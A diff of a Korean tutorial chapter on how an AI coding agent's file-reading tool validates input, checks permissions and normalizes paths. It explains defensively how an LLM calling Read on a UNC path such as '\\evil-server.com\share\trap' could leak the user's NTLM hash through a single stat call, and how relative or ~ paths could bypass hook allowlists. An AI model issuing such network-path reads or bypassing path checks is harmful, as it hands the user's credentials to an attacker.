@@ -59,12 +59,12 @@ class ReadInput(BaseModel):
     offset: int | None = None
     limit: int | None = None
 
-class FileReadTool(ToolBase):
+class FileReadTool(ToolBase[ReadInput]):
     name = "Read"
     input_model = ReadInput
 
-    def is_concurrency_safe(self) -> bool: return True  # 기본값 override
-    def is_read_only(self) -> bool: return True         # 기본값 override
+    def is_concurrency_safe(self, input: ReadInput) -> bool: return True  # 기본값 override
+    def is_read_only(self, input: ReadInput) -> bool: return True         # 기본값 override
 
     def description(self) -> str:
         return "Read a file from disk"
@@ -156,14 +156,16 @@ async def validate_input(self, args: dict, ctx) -> tuple[bool, str]:
 
 코드 461줄에 이런 주석이 달려 있다.
 
-:::tabs
-
 ```typescript
 // SECURITY: UNC path check (no I/O) — defer filesystem operations
 // until after user grants permission to prevent NTLM credential leaks
 ```
 
-**UNC 경로**는 Windows의 네트워크 공유 경로다. `\\server\share\file.txt` 같은 형태. 만약 LLM이 악의적으로 UNC 경로를 만들어서 `Read('\\evil-server.com\share\trap')`을 호출했다고 하자. 시스템이 "파일이 존재하나?"를 확인하려고 `fs.stat()` 한 줄만 호출해도 — Windows는 **NTLM 인증 핸드셰이크**를 보낸다. 공격자 서버는 그 핸드셰이크에서 **현재 사용자의 NTLM 해시**를 받는다. 그걸 깨면 비밀번호. 단지 **경로를 stat 했을 뿐**인데.
+**UNC(Universal Naming Convention) 경로**는 Windows 의 네트워크 공유 경로 형식이다. `\\server\share\file.txt` 처럼 **이중 백슬래시** 로 시작해 로컬 파일이 아니라 원격 서버의 자원을 가리킨다 (SMB/CIFS 프로토콜로 접근).
+
+만약 LLM 이 악의적으로 UNC 경로를 만들어서 `Read('\\evil-server.com\share\trap')` 을 호출했다고 하자. 시스템이 "파일이 존재하나?" 를 확인하려고 `fs.stat()` 한 줄만 호출해도 — Windows 는 **NTLM(NT LAN Manager) 인증 핸드셰이크** 를 자동으로 보낸다. **NTLM** 은 Microsoft 의 challenge-response 인증 프로토콜로, SMB 같은 네트워크 자원 접근 시 사용자 자격증명을 자동 전송하는 데 쓰인다 — 사용자가 의식하지 않아도.
+
+공격자 서버는 그 핸드셰이크에서 **현재 사용자의 NTLM 해시** 를 받는다. 그 해시는 오프라인 brute-force / rainbow table 로 깰 수 있다 — 깨면 비밀번호 평문. 단지 **경로를 stat 했을 뿐**인데.
 
 이 사고를 막는 유일한 방법: **사용자가 권한을 허락하기 전에는 그 어떤 파일 시스템 호출도 하지 않는다.** 그래서 `validateInput`은 디스크를 만지지 않고 문자열 검사만 한다. UNC 경로는 그냥 통과시킨다 (`return { result: true }`). I/O는 사용자가 권한을 명시적으로 허락한 다음, 즉 `call()` 안에서만 일어난다.
 
@@ -174,6 +176,8 @@ async def validate_input(self, args: dict, ctx) -> tuple[bool, str]:
 > ⚙️ **같은 패턴이 다른 자리에서.** `backfillObservableInput` (`FileReadTool.ts:388-394`) 안에도 비슷한 보안 미장면이 있다. 주석: "hooks.mdx documents file_path as absolute; expand so hook allowlists can't be bypassed via ~ or relative paths". hook의 allowlist가 **expand된 절대 경로**만 본다는 보장을 만들기 위해, 도구가 자기 입력의 사본을 명시적으로 정규화한다. **경로 정규화 = 보안**이라는 같은 원칙이 **NTLM 방어**와 **hook 우회 방지** 두 곳에서 동시에 작동한다. 보안 미장면은 한 군데가 아니다.
 
 ### 2단계: `checkPermissions` — 권한 시스템에 위임
+
+:::tabs
 
 ```typescript
 async checkPermissions(input, context): Promise<PermissionDecision> {
@@ -324,6 +328,15 @@ async def execute_read(input: ReadInput, app_state) -> str:
 3단계가 순서대로. 1단계에서 디스크 안 만짐. 2단계에서 공통 함수에 위임. 3단계에서 진짜 일. **TypeScript 1,184줄짜리 도구의 본질이 Python 50줄로 옮겨진다.** 나머지 1,134줄은 PDF/이미지/dedup/토큰 예산 — **Read의 본질이 아니라 각 파일 형식의 본질**이다.
 
 > 💡 **3단계 패턴은 보편적이다.** Web 프레임워크의 미들웨어도 같은 흐름이다. 입력 검증 → 인증/권한 → 핸들러. FastAPI의 `Depends`로 권한 검사를 분리하는 것도 본질이 같다. 책임을 분리하면 잘못된 순서로 일어나는 사고를 막을 수 있다.
+
+> 💡 **`.expanduser().resolve()` — 두 메서드의 역할 차이:**
+>
+> - **`.expanduser()`**: `~` 를 사용자 홈 디렉토리로 확장. `~/foo` → `/Users/me/foo`. **단순 문자열 치환** — 파일 시스템 접근 안 함. `~` 없으면 아무것도 안 함.
+> - **`.resolve()`**: 상대 경로 → 절대 경로 + `.`/`..` 정규화 + **심볼릭 링크 해제** (있으면 실제 가리키는 곳까지 따라감). CWD (`os.getcwd()`) 기준으로 변환.
+>
+> **왜 같이 쓰나?** `resolve()` 는 `~` 를 *폴더 이름* 으로 취급한다 — `Path("~/foo").resolve()` 는 `/cwd/~/foo` 같은 결과 (의도와 다름). `expanduser()` 가 먼저 `~` 를 풀어줘야 함. 순서가 중요: `.expanduser().resolve()` (이 순서).
+>
+> 한 줄 요약: **`expanduser` = `~` 확장만**, **`resolve` = 절대화 + 정규화 + 링크 해제**.
 
 ---
 
